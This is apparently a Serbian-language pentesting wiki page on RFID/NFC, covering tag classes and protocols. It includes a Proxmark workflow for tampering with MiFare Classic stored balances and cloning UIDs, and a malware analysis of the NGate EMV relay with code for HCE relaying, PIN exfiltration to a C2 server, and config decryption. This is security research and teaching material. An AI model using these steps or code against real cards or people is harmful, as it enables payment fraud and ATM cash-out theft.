# Pentesting RFID

{{#include ../../banners/hacktricks-training.md}}

## Introduction

**Radio Frequency Identification (RFID)** je najpopularnije rešenje za kratki domet koristeći radio. Obično se koristi za skladištenje i prenos informacija koje identifikuju entitet.

RFID tag može imati **svoj izvor napajanja (active)**, kao što je ugrađena baterija, ili primati napajanje od čitačke antene koristeći struju **induktovanu iz primljenih radio talasa** (**passive**).

### Classes

EPCglobal deli RFID tagove u šest kategorija. Tag u svakoj kategoriji ima sve mogućnosti navedene u prethodnoj kategoriji, što ga čini unazad kompatibilnim.

- **Class 0** tagovi su **passive** tagovi koji rade u **UHF** opsegu. Vendor ih **preprogramira** u fabrici. Kao rezultat, **ne možete promeniti** informacije sačuvane u njihovoj memoriji.
- **Class 1** tagovi takođe mogu raditi u **HF** opsegu. Pored toga, mogu se **zapisati samo jednom** nakon proizvodnje. Mnogi Class 1 tagovi takođe mogu obrađivati **cyclic redundancy checks** (CRCs) komandi koje primaju. CRC su nekoliko dodatnih bajtova na kraju komandi za detekciju grešaka.
- **Class 2** tagovi mogu se **pisati više puta**.
- **Class 3** tagovi mogu sadržati **ugrađene senzore** koji mogu beležiti parametre okoline, kao što su trenutna temperatura ili kretanje taga. Ovi tagovi su **semi-passive**, jer iako **imaju** ugrađeni izvor napajanja, kao što je integrisana **baterija**, **ne mogu inicirati** bežičnu **komunikaciju** sa drugim tagovima ili čitačima.
- **Class 4** tagovi mogu inicirati komunikaciju sa drugim tagovima iste klase, čineći ih **active tags**.
- **Class 5** tagovi mogu obezbediti **napajanje drugim tagovima i komunicirati sa svim prethodnim klasama** tagova. Class 5 tagovi mogu delovati kao **RFID readers**.

### Information Stored in RFID Tags

Memorija RFID taga obično čuva četiri vrste podataka: **identification data**, koja **identifikuje** **entitet** na koji je tag pričvršćen (ovi podaci uključuju polja definisana od strane korisnika, kao što su bankovni računi); **supplementary data**, koja pruža **dodatne** **detalje** o entitetu; **control data**, koja se koristi za internu **konfiguraciju** taga; i **manufacturer data** taga, koja sadrži jedinstveni identifikator taga (UID) i detalje o proizvodnji, tipu i vendoru taga. Prve dve vrste podataka se nalaze u svim komercijalnim tagovima; poslednje dve mogu varirati u zavisnosti od vendora.

ISO standard specificira vrednost Application Family Identifier (**AFI**), kod koji označava **vrstu objekta** kojem tag pripada. Još jedan važan registar, takođe specificiran od strane ISO, je Data Storage Format Identifier(**DSFID**), koji definiše **logičku organizaciju korisničkih podataka**.

Većina RFID **security controls** ima mehanizme koji **ograničavaju** operacije **read** ili **write** na svakom korisničkom bloku memorije i na specijalnim registrima koji sadrže AFI i DSFID vrednosti. Ovi **lock** **mechanisms** koriste podatke sačuvane u control memoriji i imaju **default passwords** prethodno konfigurisane od strane vendora, ali dozvoljavaju vlasnicima tagova da **konfigurišu sopstvene lozinke**.

### Low & High frequency tags comparison

<figure><img src="../../images/image (983).png" alt=""><figcaption></figcaption></figure>

## Low-Frequency RFID Tags (125kHz)

**Low-frequency tags** se često koriste u sistemima gde **nije potrebna visoka bezbednost**: pristup zgradama, interfon ključevi, kartice za članstvo u teretani, itd. Zbog većeg dometa, pogodne su za naplatu parkinga: vozač ne mora da približi karticu čitaču, jer se aktivira sa veće udaljenosti. Istovremeno, low-frequency tagovi su vrlo primitivni i imaju nizak protok podataka. Zbog toga je nemoguće implementirati složenu dvosmernu razmenu podataka za stvari kao što su balans i kriptografija. Low-frequency tagovi samo prenose svoj kratki ID bez ikakvih sredstava za autentifikaciju.

Ovi uređaji se oslanjaju na **passive RFID** tehnologiju i rade u **opsegu od 30 kHz do 300 kHz**, iako je uobičajeno koristiti 125 kHz do 134 kHz:

- **Long Range** — niža frekvencija znači veći domet. Postoje neki EM-Marin i HID readers koji rade sa udaljenosti do metra. Često se koriste na parkingu.
- **Primitive protocol** — zbog niskog protoka podataka ovi tagovi mogu samo preneti svoj kratki ID. U većini slučajeva podaci nisu autentifikovani i nisu na bilo koji način zaštićeni. Čim se kartica nađe u dometu čitača, jednostavno počinje da šalje svoj ID.
- **Low security** — ove kartice se lako mogu kopirati, ili čak pročitati iz tuđeg džepa zbog primitivnosti protokola.

**Popular 125 kHz protocols:**

- **EM-Marin** — EM4100, EM4102. Najpopularniji protokol u CIS. Može se pročitati sa oko metar zbog jednostavnosti i stabilnosti.
- **HID Prox II** — low-frequency protokol predstavljen od strane HID Global. Ovaj protokol je popularniji u zapadnim zemljama. Složeniji je i kartice i čitači za ovaj protokol su relativno skupi.
- **Indala** — vrlo stari low-frequency protokol koji je uveo Motorola, a kasnije ga je preuzeo HID. Manje je verovatno da ćete ga sresti u divljini u poređenju sa prethodna dva jer izlazi iz upotrebe.

U realnosti postoji mnogo više low-frequency protokola. Ali svi oni koriste istu modulaciju na fizičkom sloju i mogu se smatrati, na ovaj ili onaj način, varijacijama gore navedenih.

### Attack

Možete **attack** ove tagove sa Flipper Zero:


{{#ref}}
flipper-zero/fz-125khz-rfid.md
{{#endref}}

## High-Frequency RFID Tags (13.56 MHz)

**High-frequency tags** se koriste za složeniju interakciju čitača i taga kada su potrebni kriptografija, velika dvosmerna razmena podataka, autentifikacija itd.\
Obično se nalaze u bankovnim karticama, javnom prevozu i drugim sigurnim propusnicama.

**High-frequency 13.56 MHz tags are a set of standards and protocols**. Često se nazivaju [NFC](https://nfc-forum.org/what-is-nfc/about-the-technology/), ali to nije uvek tačno. Osnovni skup protokola koji se koristi na fizičkom i logičkom nivou je ISO 14443. Protokoli višeg nivoa, kao i alternativni standardi (kao što je ISO 19092), zasnivaju se na njemu. Mnogi ljudi ovu tehnologiju nazivaju **Near Field Communication (NFC)**, terminom za uređaje koji rade na frekvenciji od 13.56 MHz.

<figure><img src="../../images/image (930).png" alt=""><figcaption></figcaption></figure>

Jednostavno rečeno, NFC arhitektura funkcioniše ovako: prenosni protokol bira kompanija koja pravi kartice i implementira ga bazirano na niskonivou ISO 14443. Na primer, NXP je izmislio sopstveni visokonivo prenosni protokol nazvan Mifare. Ali na nižem nivou, Mifare kartice se zasnivaju na ISO 14443-A standardu.

Flipper može da komunicira i sa niskonivom ISO 14443 protokola, kao i sa Mifare Ultralight data transfer protokolom i EMV koji se koristi u bankovnim karticama. Radimo na dodavanju podrške za Mifare Classic i NFC NDEF. Detaljan pregled protokola i standarda koji čine NFC zaslužuje poseban članak koji planiramo objaviti kasnije.

Sve high-frequency kartice zasnovane na ISO 14443-A standardu imaju jedinstveni chip ID. On funkcioniše kao serijski broj kartice, kao MAC adresa mrežne kartice. **Obično je UID dug 4 ili 7 bajtova**, ali retko može ići **i do 10**. UID nije tajna i lako se čita, **ponekad čak i odštampan na samoj kartici**.

Mnogo sistema za kontrolu pristupa se oslanja na UID da **autentifikuje i dozvoli pristup**. Ponekad se to dešava **čak i kada RFID tagovi podržavaju kriptografiju**. Takva **pogrešna upotreba** svodi ih na nivo glupih **125 kHz kartica** u smislu **bezbednosti**. Virtualne kartice (kao Apple Pay) koriste dinamički UID da vlasnici telefona ne bi otvarali vrata pomoću njihove platne aplikacije.

- **Low range** — high-frequency kartice su dizajnirane tako da moraju biti postavljene blizu čitača. To takođe pomaže u zaštiti kartice od neautorizovanih interakcija. Maksimalni domet čitanja koji smo uspeli postići bio je oko 15 cm, i to sa čitačima izrađenim po meri za veći domet.
- **Advanced protocols** — brzine prenosa podataka do 424 kbps omogućavaju složene protokole sa punom dvosmernom razmenom podataka. Što zauzvrat **omogućava kriptografiju**, prenos podataka itd.
- **High security** — high-frequency contactless kartice ni u kom smislu nisu inferiorne u odnosu na smart kartice. Postoje kartice koje podržavaju kriptografski snažne algoritme kao što je AES i implementiraju asimetričnu kriptografiju.

### Attack

Možete **attack** ove tagove sa Flipper Zero:


{{#ref}}
flipper-zero/fz-nfc.md
{{#endref}}

Ili koristeći **proxmark**:


{{#ref}}
proxmark-3.md
{{#endref}}

### MiFare Classic offline stored-value tampering (broken Crypto1)

Kada sistem skladišti novčani balans direktno na MiFare Classic kartici, često ga možete manipulisati jer Classic koristi NXP-ov zastareli Crypto1 šifarski algoritam. Crypto1 je godinama probijen, što omogućava povraćaj sektor ključeva i potpuno čitanje/pisanje memorije kartice koristeći običan hardver (npr. Proxmark3).

End-to-end workflow (apstraktno):

1) Napravite dump originalne kartice i povratite ključeve
```bash
# Attempt all built-in Classic key recovery attacks and dump the card
hf mf autopwn
```
Ovo obično vraća sector keys (A/B) i generiše full-card dump u client dumps folderu.

2) Pronađite i razumite value/integrity polja

- Izvršite legitimne dopune na originalnoj kartici i napravite više dumps (pre/posle).
- Napravite diff između ta dva dumps kako biste identifikovali menjajuće blokove/bajte koji predstavljaju balance i eventualna integrity polja.
- Mnoge Classic implementacije ili koriste native "value block" encoding ili prave sopstvene checksums (npr. XOR of the balance with another field and a constant). Nakon izmene balance-a, ponovo izračunajte integrity bajtove odgovarajuće i osigurajte da su sva duplirana/komplementarna polja konzistentna.

3) Zapišite izmenjeni dump na writable “Chinese magic” Classic tag
```bash
# Load a modified binary dump onto a UID-changeable Classic tag
hf mf cload -f modified.bin
```
4) Clone original UID tako da terminali prepoznaju karticu
```bash
# Set the UID on a UID-changeable tag (gen1a/gen2 magic)
hf mf csetuid -u <original_uid>
```
5) Korišćenje na terminalima

Čitači koji veruju stanju na kartici i UID-u prihvatiće izmenjenu karticu. Terenska zapažanja pokazuju da mnoge implementacije ograničavaju iznose na osnovu širine polja (npr. 16-bit fixed-point).

Napomene

- Ako sistem koristi native Classic value blocks, imajte na umu format: value (4B) + ~value (4B) + value (4B) + block address + ~address. Svi delovi moraju da se poklapaju.
- Za prilagođene formate sa jednostavnim checksums, diferencijalna analiza je najbrži način da se izvede funkcija integriteta bez reverzovanja firmvera.
- Samo tagovi kojima se UID može promeniti ("Chinese magic" gen1a/gen2) dozvoljavaju pisanje bloka 0/UID. Normalne Classic kartice imaju UID koji su samo za čitanje.

Za praktične Proxmark3 komande, pogledajte:


{{#ref}}
proxmark-3.md
{{#endref}}

### Izrada prenosivog HID MaxiProx 125 kHz mobilnog klonera

Ako vam treba **dugog dometa**, **na baterije** rešenje za prikupljanje HID Prox® bedževa tokom red-team angažmana, možete preurediti zidni čitač **HID MaxiProx 5375** u samostalan kloner koji staje u ranac. Potpun mehanički i električni vodič dostupan je ovde:


{{#ref}}
maxiprox-mobile-cloner.md
{{#endref}}

## NFC/EMV Relay via Android Reader↔HCE Emitter

Classic EMV relay može se implementirati sa 2 Android uređaja: reader na strani žrtve koji snima žive APDUs i PIN sa prave kartice, i attacker-side HCE emitter kod terminala koji prosleđuje APDUs uzvodno. Analizovani NGate kit zloupotrebljava legitimne Android NFC APIs i jednostavan framed TCP C2 da orkestrira isplate gotovine sa ATM-a u realnom vremenu.

Ključne komponente

- Reader-mode app (victim): koristi NFC reader APIs za parsiranje EMV (PAN/expiry/AIDs), prikazuje scheme po AID-u, traži PIN i odmah eksfiltrira.
- Emitter-mode app (ATM side): implementira Host Card Emulation (HCE) sa `android:requireDeviceUnlock="false"` i a payment AID; `processCommandApdu()` prosleđuje APDUs ka C2 i vraća minimalan odgovor.
- Wire protocol: length-prefixed frames, periodic keepalive; opciono TLS.

Android surface (Manifest/HCE)
```xml
<uses-permission android:name="android.permission.NFC"/>
<uses-permission android:name="android.permission.INTERNET"/>
<service android:name=".nfc.hce.ApduService"
android:permission="android.permission.BIND_NFC_SERVICE"
android:exported="true">
<intent-filter>
<action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
<category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
<meta-data android:name="android.nfc.cardemulation.host_apdu_service"
android:resource="@xml/hce"/>
</service>
```
hce.xml primer (bez otključavanja + AID za plaćanje)
```xml
<host-apdu-service android:requireDeviceUnlock="false"
android:description="relay">
<aid-group android:category="other">
<aid-filter android:name="F001020304050607"/>
</aid-group>
<aid-group android:category="payment">
<aid-filter android:name="F001020304050607"/>
</aid-group>
</host-apdu-service>
```
Transparentan relay endpoint (HCE)
```java
@Override public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
Log.d("ApduService", "APDU-IN: " + toHex(apdu));
bus.forward(apdu); // send upstream to C2/reader
return new byte[0]; // empty response, pure relay endpoint
}
```
Zaključivanje EMV sistema po AID-u (primeri)

- A000000004 → Mastercard
- A000000003 → Visa
- A000000658 → MIR
- A000000333 → UnionPay

Šablon prikupljanja PIN-a (UI žrtve)
```java
// Custom keypad publishes when required length (e.g., 4) is reached
if (pin.length() == 4) postDelayed(() -> bus.publish(pin), 100L);
// Network immediately exfiltrates via dedicated opcode
send(OP_PIN_REQ, pin.getBytes(StandardCharsets.UTF_8));
```
Framed C2 (cleartext example)

- Client→Server: int32 len | int32 opcode | body
- Server→Client: int32 len | body (opcode inside payload)
- Odbaciti sadržaje > ~100 MiB; keepalive ~7s (PING)
```java
// send
out.writeInt(body.length); out.writeInt(op); out.write(body); out.flush();
// recv
int len = in.readInt(); byte[] body = new byte[len]; in.readFully(body);
```
Sakrivanje konfiguracije: XOR izveden iz sertifikata

- Native biblioteka izvodi 32-bajtni ključ kao SHA‑256 od sertifikata za potpisivanje aplikacije (DER).
- C2 konfiguracija je u ASCII‑hex u assets (npr. `assets/____`), hex-decoded i XOR-ed sa ključem koji se ponavlja svakih 32 bajta:
```c
for (size_t i = 0; i < len; i++) pt[i] = ct[i] ^ key[i & 31];
```
Offline PoC za decrypt config
```bash
# Extract signing cert digest
apksigner verify --print-certs sample.apk
# "Signer #1 certificate SHA-256 digest: <hex>"
```

```python
import pathlib
key = bytes.fromhex("<sha256_of_signing_cert>")
ct  = bytes.fromhex(pathlib.Path("/path/to/assets/____").read_text().strip())
pt  = bytes(c ^ key[i % 32] for i, c in enumerate(ct))
print(pt.decode("utf-8", errors="replace"))
```
Primer dekriptovanih polja: `host`, `port`, `sharedToken`, `tls`, `mode`, `reader`, `uniqueID`, `ttd`.

Lanac relay-a (end-to-end)

1) Žrtva instalira APK, otvara aplikaciju → native init dekriptuje config iz assets.
2) Aplikacija se povezuje na C2 (npr. `91.84.97.13:5653`) koristeći framed TCP; keepalive ~7s.
3) Žrtva tapne karticu → reader izdvaja PAN/expiry/AIDs i šalje CARD_DISCOVERED.
4) Žrtva unese PIN → keypad publikuje i eksfiltruje putem PIN_REQ; server odgovara VALID/INVALID samo za UI.
5) Napadačev uređaj na terminalu pokreće HCE emitter koji relaja APDU-e ka ATM-u i izvodi cash-out.

---

## References

- [https://blog.flipperzero.one/rfid/](https://blog.flipperzero.one/rfid/)
- [Let's Clone a Cloner – Part 3 (TrustedSec)](https://trustedsec.com/blog/lets-clone-a-cloner-part-3-putting-it-all-together)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [MIFARE security overview (Wikipedia)](https://en.wikipedia.org/wiki/MIFARE#Security)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [Analysis of NGate malware campaign (CERT-PL)](https://cert.pl/en/posts/2025/11/analiza-ngate/)
- [Android apksigner – verify/print-certs](https://developer.android.com/studio/command-line/apksigner)
- [Android Host Card Emulation (HCE) overview](https://developer.android.com/guide/topics/connectivity/nfc/hce)

{{#include ../../banners/hacktricks-training.md}}
